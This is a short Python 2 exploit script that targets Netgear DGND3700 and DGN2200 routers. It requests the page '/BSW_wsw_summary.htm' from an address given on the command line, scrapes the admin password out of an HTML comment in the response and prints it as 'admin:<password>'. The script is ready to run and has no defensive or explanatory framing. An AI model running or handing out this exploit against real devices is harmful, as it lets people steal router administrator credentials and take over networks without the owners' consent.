import requests
import re
import sys

#DGND3700&DGN2200_PASSLEAK.py http://xx.xxx.xx.xx

def showpass(url):
	header = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;"}
	url = sys.argv[1] + "/BSW_wsw_summary.htm"
	try:
		res = requests.get(url, headers=header, verify=False, timeout=8)
		data = res.content
	except Exception as e:
		pass
	respnose = data.find("<!-- CA")
	if respnose > -1:
		sign = data[respnose:respnose+500]
		passs = re.findall(">\S+<",sign,re.IGNORECASE)
		passwd = passs[1][1:-1]
		print "admin:"+passwd
	else:
		return None

if __name__ == "__main__":
	if(sys.argv[1]):
		showpass(sys.argv[1])
	else:
		print 'please add command param'
